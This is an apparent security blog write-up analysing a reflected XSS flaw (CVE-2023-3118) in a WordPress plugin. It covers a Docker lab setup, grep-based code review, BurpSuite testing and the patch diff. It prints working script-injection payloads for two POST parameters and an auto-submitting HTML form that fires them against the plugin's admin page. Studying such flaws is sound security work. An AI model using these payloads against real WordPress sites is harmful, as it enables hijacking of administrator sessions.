---
title: "CVE-2023-3118 - Export All URLs < 4.6 - Reflected XSS"
draft: false
tags: ["cve_analysis"]
categories: ["Web Security"]
weight: 4
---
![Description of Image](/images/cve-2023-3118/cve-poster.png)

## On this page

- [Description](#description)
- [Lab Setup](#lab-setup)
- [BlackBox Testing](#blackbox-testing)
- [Patch Diffing](#patch-diffing)
- [Resources](#resources)

### Description
The Export All URLs WordPress plugin before 4.6 does not sanitise and escape a parameter before outputting them back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

![Description of Image](/images/cve-2023-3118/cve-2023-3118-security.png)

### Lab-Setup
```sh
mkdir cve-2023-3118
```
create `docker-compose.yml` file
```php
version: '3.8'

services:
  db:
    image: mysql:5.7
    volumes:
      - db_data:/var/lib/mysql
    restart: always
    environment:
      MYSQL_ROOT_PASSWORD: MySQLP@ssw0rd
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wordpress
      MYSQL_PASSWORD: wordpress

  wordpress:
    depends_on:
      - db
    image: wordpress:latest
    ports:
      - "8000:80"
    restart: always
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpress
      WORDPRESS_DB_NAME: wordpress
    volumes:
      - wordpress_data:/var/www/html

volumes:
  db_data:
  wordpress_data:
  ```
  then run `docker-compose up` to run the image
![Description of Image](/images/cve-2023-3118/docker-compose-up.png)

When you go to <http://localhost:8000/> you will see the wordpress installation page
![Image](/images/cve-2023-23489/wordpress-install.png)
![Image](/images/cve-2023-23489/wordpress-install2.png)
<br>
![Image](/images/cve-2023-23489/wordpress-plugins.png)
<br>
![Image](/images/cve-2023-23489/upload-plugins.png)
I searched for `easy digital downloads`
![Image](/images/cve-2023-3118/export-all-urls-search.png)
<br>
![Image](/images/cve-2023-3118/wordpress-export-all-urls-search.png)
Go to Advanced View Section
![Image](/images/cve-2023-3118/AdvancedView-export-all-urls-search.png)

The description of the vulnerability states that versions below 4.6 are vulnerable. We will download both 4.5 and 4.6 to analyze the patch for the vulnerability.
![Image](/images/cve-2023-3118/export-all-urls-Development-Version.png)
![Image](/images/cve-2023-3118/ls-files.png)

Let's upload the vulnerable plugin to WordPress. Press the "Browse" button and choose export-all-urls.4.5.zip
 ![Image](/images/cve-2023-23489/upload2.png)
Then press on the `Install Now` Button
 ![Image](/images/cve-2023-23489/install-plugin1.png)
 Then press on the `Activate Plugin` Button
 ![Image](/images/cve-2023-3118/activate-plugin.png)
The plugin was installed successfully.
![Image](/images/cve-2023-3118/plugin-ins.png)

### BlackBox Testing
I will test the vulnerable version as we don't know where the vulnerability is located
![Image](/images/cve-2023-3118/ls-files2.png)
First, I will search for all `GET` methods in PHP files to see if any can be exploited.
```php
grep --color=always -r '$_GET' --include="*.php" .
```
The line that appears in the output is used in WordPress security to verify a nonce (a number used once) and prevent CSRF (Cross-Site Request Forgery) attacks, so it is not useful for exploitation.
![Image](/images/cve-2023-3118/grep-get.png)

Let's now search for all `POST` Methods
```php
grep --color=always -r '$_POST' --include="*.php" .
```
As you see from the output the `sanitize_text_field`  & `sanitize_file_name` functions are used in many lines. [sanitize_text_field()](https://developer.wordpress.org/reference/functions/sanitize_text_field/) is a WordPress built-in function that sanitize user input. [sanitize_file_name](https://developer.wordpress.org/reference/functions/sanitize_file_name/) is a WordPress built-in function that sanitizes a filename, replacing whitespace with dashes.

![Image](/images/cve-2023-3118/grep-post1.png)
So the `POST` Methods that are inside `sanitize_text_field` & `sanitize_file_name` functions is useless to us.
<br>
Let's remove the lines that contain this function.
```php
grep --color=always -r '$_POST' --include="*.php" . | grep -v 'sanitize_text_field'
```
There are two interesting lines that accept user input and print it as it is without any sanitization.
![Image](/images/cve-2023-3118/xss1.png)
```php
<?php echo isset($_POST['starting-point']) ===> Print starting-point value
<?php echo isset($_POST['ending-point'])   ===> Print ending-point value
```
When user input is submitted as is, the first vulnerability that comes to mind is [XSS](https://owasp.org/www-community/attacks/xss/)
<br>
Let's see if we can exploit this
I will go to the plugin location from `Tools`
![Image](/images/cve-2023-3118/plugin-installed.png)
Then press on `Show Filter Options` and `Show Advanced Options` to see all the available inputs
![Image](/images/cve-2023-3118/plugin-page1.png)
I want to find the location of POST Parameters `starting-point` & `ending-point` at this page
<br>
`Right Click - View Page Source` ( CTRL + U )
<br>
And search for keyword `starting-point`. You will find it's under `Number of Posts` keyword
![Image](/images/cve-2023-3118/search-starting-point.png)

To confirm that, press `F12` to inspect the page. If you click on the box near the word `From`, you will find it corresponds to the `starting-point` POST parameter, and the box near `To` corresponds to the `ending-point` POST parameter.
![Image](/images/cve-2023-3118/starting-ending-point-locations.png)
Let's enter any values and then press `Export Now` Button
![Image](/images/cve-2023-3118/endpoint-locations2.png)
I intercepted the request with BurpSuite
![Image](/images/cve-2023-3118/burpintercept1.png)

Let's see how we can exploit this vulnerability. From page source this is where the `starting-point` & `ending-point` values are located

 - <span style="color: red;">From: <input type=&quot;number&quot; name=&quot;starting-point&quot; placeholder=&quot;0&quot; value="</span><span style="color: blue;">{starting-point-User-Input}</span><span style="color: red;">&quot;&gt;</span>

-  <span style="color: red;">To: <input type=&quot;number&quot; name=&quot;ending-point&quot; placeholder=&quot;500&quot; value="</span><span style="color: blue;">{ending-point-User-Input}</span><span style="color: red;">&quot;&gt;</span>
So we need to <span style="color: green;">close the tags</span> and put our <span style="color: blue;">payload</span>.
<br>
Our First payload with the closed tags will be like that 
<br>
<span style="color: red;">From: <input type=&quot;number&quot; name=&quot;starting-point&quot; placeholder=&quot;0&quot; value="</span><span style="color: green;">&quot;></span><span style="color: blue;">&lt;script&gt;alert(/XSS-starting-point/)&lt;/script&gt;</span><span style="color: green;">&lt;&quot;</span><span style="color: red;">&quot;&gt;</span>
<br>
Our Second payload with the closed tags will be like that 
<br>
<span style="color: red;">To: <input type=&quot;number&quot; name=&quot;ending-point&quot; placeholder=&quot;500&quot; value="</span><span style="color: green;">&quot;></span><span style="color: blue;">&lt;script&gt;alert(/XSS-ending-point/)&lt;/script&gt;</span><span style="color: green;">&lt;&quot;</span><span style="color: red;">&quot;&gt;</span>
<br>
Let's test this by sending our intercepted request in BurpSuite to the Repeater tab. 
![Image](/images/cve-2023-3118/request-repeater1.png)
Then Right Click and choose `Show response in browser`
![Image](/images/cve-2023-3118/request-repeater2.png)
Copy the given url and submit it in the browser. As you can see, the XSS is triggered
![Image](/images/cve-2023-3118/xss1-1.png)

![Image](/images/cve-2023-3118/xss2.png)

We can automate this process by putting this HTML code in any page
```php
<body onload="document.forms[0].submit()">
    <form action="http://localhost:8000/wp-admin/tools.php?page=extract-all-urls-settings" method="POST">
        <input type="hidden" name="starting-point" value='"><script>alert(/XSS-starting-point/)</script>' />
        <input type="hidden" name="ending-point" value='"><script>alert(/XSS-ending-point/)</script>' />
        <input type="submit" value="submit">
    </form>
</body>
```
Go to Pages - Add New Page
![Image](/images/cve-2023-3118/new-page1.png)
Press on the ➕ Sign and type html in the search box and choose `Custom HTML` 
![Image](/images/cve-2023-3118/new-page2.png)
Then put our html code and press `Publish`
![Image](/images/cve-2023-3118/publish-page1.png)
Go to Pages and view the page where we placed our payload.
![Image](/images/cve-2023-3118/pages-view1.png)
As you see the XSS is triggered to anyone who visits this page 
![Image](/images/cve-2023-3118/xss-view-page1.png)

![Image](/images/cve-2023-3118/xss-view-page2.png)

### Patch Diffing
Now, Let’s take a look at the patch that used to prevent the vulnerability, We can see the patch information on wordpress from [here](https://plugins.trac.wordpress.org/changeset?old_path=%2Fexport-all-urls%2Ftags%2F4.6&old=2990491&new_path=%2Fexport-all-urls%2Ftags%2F4.5&new=2926489&sfp_email=&sfph_mail=). As we can see, the vulnerable `POST` methods have been placed inside `esc_attr`, which is used for escaping HTML attributes.
![Image](/images/cve-2023-3118/patch-diff1.png)

### Resources
https://nvd.nist.gov/vuln/detail/CVE-2023-3118
https://wpscan.com/vulnerability/8a9efc8d-561a-42c6-8e61-ae5c3be581ea/